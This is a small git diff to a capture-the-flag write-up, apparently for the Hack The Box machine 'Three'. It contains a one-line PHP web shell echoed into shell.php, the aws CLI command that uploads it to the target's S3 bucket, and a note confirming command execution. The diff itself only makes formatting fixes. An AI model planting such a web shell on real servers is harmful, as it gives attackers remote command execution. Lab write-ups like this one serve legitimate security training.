@@ -75,13 +75,12 @@ echo '<?php system($_GET["cmd"]); ?>' >  shell.php
 Uploaded the PHP shell file to the S3 bucket:
 
 ```bash 
-aws --endpoint=http://s3.thetoppers.htb/ s3 cp shell.php s3://thetoppers.htb
+aws --endpoint=http://s3.thetoppers.htb/ s3 cp shell.php s3://thetoppers.htb/
 ```
 
 ![Shell-Upload](Images/three_shell-upload.jpeg)
 
 Confirmed the existence of the uploaded shell by navigating to http://s3.thetoppers.htb/shell.php and executing the id command 
-
 
 [!Shell-Success](Images/three_shell-confirmation.jpeg)
 
